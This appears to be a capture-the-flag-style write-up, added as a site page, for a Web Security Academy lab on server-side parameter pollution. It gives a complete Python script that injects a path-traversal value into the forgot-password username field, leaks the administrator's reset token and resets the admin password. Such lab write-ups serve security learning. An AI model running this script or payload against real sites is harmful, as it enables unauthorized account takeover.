@@ -1,0 +1,178 @@
+---
+title: 'API Lab 5'
+description: 'Learn how server-side parameter pollution (SSPP) in REST APIs can lead to sensitive data exposure and full account takeover.'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Exploiting server-side parameter pollution in a REST URL
+
+<div style="text-align: justify;">
+  In this lab, I explored how server-side parameter pollution (SSPP) can impact REST API endpoints. The vulnerability stemmed from how the server processed multiple parameters—particularly when using path traversal techniques in user-controlled input. By injecting a crafted payload into a form field, I was able to access internal object properties not intended for exposure. This led to the retrieval of the admin’s password reset token and ultimately a full account takeover.
+
+  Additionally, the challenge reinforced the importance of inspecting JavaScript files used by the web application. One of the JS files revealed the internal API structure and helped uncover how parameters were handled by the backend, which was crucial for crafting the payload. It’s a reminder that client-side JavaScript can leak sensitive implementation details useful for attackers.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- Visit the **"Forgot Password"** page and request a reset token.
+- Revisit the page and inject a polluted path as the username: `../../v1/users/administrator/field/passwordResetToken#`.
+- The server returns the reset token in the JSON response.
+- Use the token to reset the admin password and take control of the account.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings (for labs or self-signed certs)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Burp Suite proxy configuration
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+def check_burp():
+    """
+    Check if Burp Suite is running by attempting a connection to the proxy.
+    """
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite is not running. Please start it and try again.")
+        sys.exit(1)
+
+def get_csrf_token(session, base_url):
+    """
+    Fetch CSRF token from the /forgot-password page.
+    """
+    try:
+        res = session.get(f"{base_url}/forgot-password", verify=False, proxies=proxies)
+        res.raise_for_status()
+    except requests.RequestException as e:
+        print(f"[-] Failed to fetch forgot-password page: {e}")
+        sys.exit(1)
+
+    soup = BeautifulSoup(res.text, 'html.parser')
+    csrf_input = soup.find("input", {"name": "csrf"})
+    
+    if not csrf_input or not csrf_input.get("value"):
+        print("[-] CSRF token not found on the page.")
+        sys.exit(1)
+
+    return csrf_input["value"]
+
+def trigger_reset_token(session, base_url, csrf_token):
+    """
+    Trigger password reset token generation for 'administrator'.
+    """
+    data = {
+        "csrf": csrf_token,
+        "username": "administrator"
+    }
+
+    try:
+        res = session.post(f"{base_url}/forgot-password", data=data, verify=False, proxies=proxies)
+        res.raise_for_status()
+    except requests.RequestException as e:
+        print(f"[-] Failed to trigger reset token: {e}")
+        sys.exit(1)
+
+def exploit_sspp(session, base_url, csrf_token):
+    """
+    Exploit server-side parameter pollution to extract reset token from internal API.
+    """
+    payload = "../../v1/users/administrator/field/passwordResetToken%23"
+    data = {
+        "csrf": csrf_token,
+        "username": payload
+    }
+
+    try:
+        res = session.post(f"{base_url}/forgot-password", data=data, verify=False, proxies=proxies)
+        res.raise_for_status()
+        result = res.json()
+        return result["result"]
+    except (requests.RequestException, ValueError, KeyError) as e:
+        print(f"[-] Failed to extract token via SSPP: {e}")
+        print(f"[-] Raw response: {res.text}")
+        sys.exit(1)
+
+def reset_admin_password(session, base_url, token, csrf_token):
+    """
+    Use leaked token to reset admin password.
+    """
+    reset_url = f"{base_url}/forgot-password?passwordResetToken={token}"
+    data = {
+        "csrf": csrf_token,
+        "passwordResetToken": token,
+        "new-password-1": "Password@123",
+        "new-password-2": "Password@123"
+    }
+
+    try:
+        res = session.post(reset_url, data=data, verify=False, proxies=proxies)
+        res.raise_for_status()
+    except requests.RequestException as e:
+        print(f"[-] Password reset failed: {e}")
+        sys.exit(1)
+
+    if "Password successfully changed" in res.text or res.status_code == 200:
+        print("[+] Password reset successful!")
+        print("[+] Use these credentials to log in:")
+        print("    Username: administrator")
+        print("    Password: Password@123")
+    else:
+        print("[-] Password reset response unexpected.")
+        print(res.text)
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        print(f"Example: python {sys.argv[0]} https://target.com")
+        sys.exit(1)
+
+    base_url = sys.argv[1].strip()
+
+    # Step 0: Ensure Burp Suite is running
+    check_burp()
+
+    # Step 1: Start session and get CSRF
+    session = requests.Session()
+    print("[*] Fetching CSRF token...")
+    csrf = get_csrf_token(session, base_url)
+
+    # Step 2: Trigger password reset to generate token
+    print("[*] Triggering reset token generation...")
+    trigger_reset_token(session, base_url, csrf)
+
+    # Step 3: Re-fetch CSRF token
+    print("[*] Re-fetching CSRF token...")
+    csrf = get_csrf_token(session, base_url)
+
+    # Step 4: Exploit to retrieve the token
+    print("[*] Exploiting SSPP to leak reset token...")
+    token = exploit_sspp(session, base_url, csrf)
+    print(f"[+] Leaked reset token: {token}")
+
+    # Step 5: Use the token to reset password
+    print("[*] Attempting to reset admin password...")
+    reset_admin_password(session, base_url, token, csrf)
+
+if __name__ == "__main__":
+    main()
+```
